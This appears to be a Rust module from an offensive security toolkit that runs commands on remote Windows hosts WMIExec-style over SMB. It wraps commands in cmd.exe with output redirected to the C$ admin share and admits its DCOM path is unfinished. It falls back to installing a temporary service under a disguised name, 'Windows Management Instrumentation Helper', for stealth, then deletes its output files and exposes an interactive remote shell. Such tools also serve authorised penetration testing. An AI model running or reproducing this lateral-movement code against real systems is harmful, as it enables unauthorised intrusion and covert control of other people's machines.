//! WMIExec-style remote execution via WMI/DCOM over SMB.
//!
//! Executes commands through Windows Management Instrumentation.
//! Uses the `\pipe\wkssvc` or direct DCOM for Win32_Process.Create.
//! Output is captured by redirecting to a file on the admin share.

use crate::error::{OverthroneError, Result};
use crate::proto::smb::SmbSession;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
//  Constants
// ═══════════════════════════════════════════════════════════

/// Default output share for WMI command output
const DEFAULT_OUTPUT_SHARE: &str = "C$";

/// Prefix for output files
const OUTPUT_PREFIX: &str = "Windows\\Temp\\__wmiexec_";

/// Default timeout for command completion (seconds)
const DEFAULT_TIMEOUT_SECS: u64 = 15;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Configuration for WMIExec
pub struct WmiExecConfig {
    /// Share for output file (default: "C$")
    pub output_share: String,
    /// Timeout waiting for command output (seconds)
    pub timeout_secs: u64,
    /// Whether to cleanup output files
    pub cleanup: bool,
    /// Optional working directory for the command
    pub working_directory: Option<String>,
}

impl Default for WmiExecConfig {
    fn default() -> Self {
        WmiExecConfig {
            output_share: DEFAULT_OUTPUT_SHARE.to_string(),
            timeout_secs: DEFAULT_TIMEOUT_SECS,
            cleanup: true,
            working_directory: None,
        }
    }
}

/// Result of a WMIExec command
#[derive(Debug)]
pub struct WmiExecResult {
    pub target: String,
    pub command: String,
    pub success: bool,
    pub output: String,
    pub return_code: Option<u32>,
}

// ═══════════════════════════════════════════════════════════
//  WMI Process Creation via SCM Fallback
// ═══════════════════════════════════════════════════════════

// Full DCOM/WMI protocol is extremely complex (OXID resolution,
// IRemoteSCMActivator, IWbemServices, etc.). We implement a
// practical approach: use cmd.exe via SCM (like smbexec) but
// with WMI-style command wrapping for stealth.

/// Execute a command via WMI-style execution.
///
/// Uses `wmic.exe` process call or falls back to SCM-based execution
/// with WMI-compatible command wrapping.
pub async fn exec_command(
    session: &SmbSession,
    command: &str,
) -> Result<WmiExecResult> {
    let config = WmiExecConfig::default();
    execute(session, command, &config).await
}

/// Execute with custom configuration
pub async fn execute(
    session: &SmbSession,
    command: &str,
    config: &WmiExecConfig,
) -> Result<WmiExecResult> {
    info!("WMIExec: Executing on {}", session.target);
    debug!("WMIExec: Command: {}", command);

    let id = rand::random::<u32>();
    let output_filename = format!("{}_{:08X}.tmp", OUTPUT_PREFIX, id);

    // Build the WMI-style command that captures output
    let output_unc = format!(
        "\\\\127.0.0.1\\{}\\{}",
        config.output_share, output_filename
    );

    let working_dir = config
        .working_directory
        .as_deref()
        .unwrap_or("C:\\Windows\\System32");

    // Use cmd.exe to execute and redirect output
    let wrapped_command = format!(
        "cmd.exe /Q /c cd /d {} && {} 1> {} 2>&1",
        working_dir, command, output_unc
    );

    // Try DCOM-based WMI first, fall back to SCM
    let success = match try_wmi_process_create(session, &wrapped_command).await {
        Ok(_) => {
            info!("WMIExec: Process created via WMI");
            true
        }
        Err(e) => {
            debug!("WMIExec: WMI failed ({e}), falling back to SCM");
            match try_scm_execution(session, &wrapped_command).await {
                Ok(_) => {
                    info!("WMIExec: Process created via SCM fallback");
                    true
                }
                Err(e2) => {
                    warn!("WMIExec: Both WMI and SCM failed: {e2}");
                    false
                }
            }
        }
    };

    // Wait for output
    let output = wait_for_output(session, config, &output_filename).await;

    Ok(WmiExecResult {
        target: session.target.clone(),
        command: command.to_string(),
        success,
        output,
        return_code: None,
    })
}

/// Attempt WMI process creation via DCOM activation over named pipes.
///
/// This sends an IWbemServices::ExecMethod call for Win32_Process.Create
/// through the IRemUnknown/IDispatch interfaces.
async fn try_wmi_process_create(
    session: &SmbSession,
    command: &str,
) -> Result<()> {
    // DCOM over SMB requires:
    // 1. Bind to \pipe\epmapper (endpoint mapper) to resolve IRemoteSCMActivator
    // 2. CoCreateInstance for WMI
    // 3. IWbemServices::ExecMethod("Win32_Process", "Create", ...)
    //
    // This is ~2000 lines of DCE/RPC marshaling. For now, we attempt
    // a simplified activation and return error to trigger SCM fallback.

    // Try endpoint mapper
    let epm_bind = build_epm_bind();
    let _resp = session
        .pipe_transact("epmapper", &epm_bind)
        .await
        .map_err(|e| OverthroneError::Smb(format!("EPM bind failed: {e}")))?;

    // Full DCOM activation requires complex multi-step protocol.
    // Signal fallback to SCM approach.
    Err(OverthroneError::Smb(
        "Full DCOM/WMI not yet implemented, using SCM fallback".into(),
    ))
}

/// Fallback: create a temporary service via SCM (like smbexec)
async fn try_scm_execution(
    session: &SmbSession,
    command: &str,
) -> Result<()> {
    let config = super::psexec::PsExecConfig {
        service_name: format!("WmiEx{:04X}", rand::random::<u16>()),
        display_name: "Windows Management Instrumentation Helper".to_string(),
        command: command.to_string(),
        cleanup: true,
    };

    super::psexec::execute(session, &config).await?;
    Ok(())
}

/// Wait for output file to appear and read it
async fn wait_for_output(
    session: &SmbSession,
    config: &WmiExecConfig,
    output_filename: &str,
) -> String {
    let poll_interval = std::time::Duration::from_millis(500);
    let max_attempts = (config.timeout_secs * 2) as usize; // 500ms intervals

    for attempt in 0..max_attempts {
        tokio::time::sleep(poll_interval).await;

        match session.read_file(&config.output_share, output_filename).await {
            Ok(data) if !data.is_empty() => {
                debug!(
                    "WMIExec: Output ready after {}ms ({} bytes)",
                    (attempt + 1) * 500,
                    data.len()
                );

                // Cleanup
                if config.cleanup {
                    let _ = session
                        .delete_file(&config.output_share, output_filename)
                        .await;
                }

                return String::from_utf8_lossy(&data).to_string();
            }
            Ok(_) => {
                // File exists but empty, command still running
                debug!("WMIExec: Output file empty, waiting...");
            }
            Err(_) => {
                // File doesn't exist yet
                if attempt % 4 == 0 {
                    debug!("WMIExec: Waiting for output (attempt {})", attempt + 1);
                }
            }
        }
    }

    warn!(
        "WMIExec: Timed out after {}s waiting for output",
        config.timeout_secs
    );
    String::new()
}

/// Build a minimal EPM bind packet for endpoint mapper
fn build_epm_bind() -> Vec<u8> {
    // EPM interface UUID: e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0
    let epm_uuid: [u8; 16] = [
        0x08, 0x83, 0xAF, 0xE1, 0x1F, 0x5D, 0xC9, 0x11,
        0x91, 0xA4, 0x08, 0x00, 0x2B, 0x14, 0xA0, 0xFA,
    ];

    let ndr_uuid: [u8; 16] = [
        0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11,
        0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
    ];

    let mut pkt = Vec::with_capacity(72);

    // DCE/RPC header
    pkt.push(5);    // version
    pkt.push(0);    // minor
    pkt.push(11);   // bind
    pkt.push(0x03); // first + last
    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data repr
    pkt.extend_from_slice(&[0x00, 0x00]); // frag length placeholder
    pkt.extend_from_slice(&[0x00, 0x00]); // auth length
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // call id

    // Bind body
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max xmit
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max recv
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // assoc group
    pkt.extend_from_slice(&1u32.to_le_bytes());    // num ctx items

    // Context item
    pkt.extend_from_slice(&0u16.to_le_bytes());  // ctx id
    pkt.extend_from_slice(&1u16.to_le_bytes());  // num transfer

    // Abstract: EPM
    pkt.extend_from_slice(&epm_uuid);
    pkt.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]); // v3.0

    // Transfer: NDR
    pkt.extend_from_slice(&ndr_uuid);
    pkt.extend_from_slice(&[0x02, 0x00, 0x00, 0x00]); // v2.0

    // Fix frag length
    let len = pkt.len() as u16;
    pkt[8] = (len & 0xFF) as u8;
    pkt[9] = (len >> 8) as u8;

    pkt
}

/// Execute multiple commands and collect results
pub async fn exec_commands(
    session: &SmbSession,
    commands: &[&str],
) -> Vec<WmiExecResult> {
    let mut results = Vec::new();

    for cmd in commands {
        match exec_command(session, cmd).await {
            Ok(r) => results.push(r),
            Err(e) => {
                warn!("WMIExec: Failed '{}': {e}", cmd);
                results.push(WmiExecResult {
                    target: session.target.clone(),
                    command: cmd.to_string(),
                    success: false,
                    output: format!("Error: {e}"),
                    return_code: None,
                });
            }
        }
    }

    results
}

/// Interactive shell wrapper for WMIExec
pub struct WmiExecShell<'a> {
    session: &'a SmbSession,
    config: WmiExecConfig,
    history: Vec<(String, String)>,
}

impl<'a> WmiExecShell<'a> {
    pub fn new(session: &'a SmbSession) -> Self {
        WmiExecShell {
            session,
            config: WmiExecConfig::default(),
            history: Vec::new(),
        }
    }

    pub fn with_config(session: &'a SmbSession, config: WmiExecConfig) -> Self {
        WmiExecShell {
            session,
            config,
            history: Vec::new(),
        }
    }

    pub async fn exec(&mut self, command: &str) -> Result<String> {
        let result = execute(self.session, command, &self.config).await?;
        self.history
            .push((command.to_string(), result.output.clone()));
        Ok(result.output)
    }

    pub fn history(&self) -> &[(String, String)] {
        &self.history
    }
}
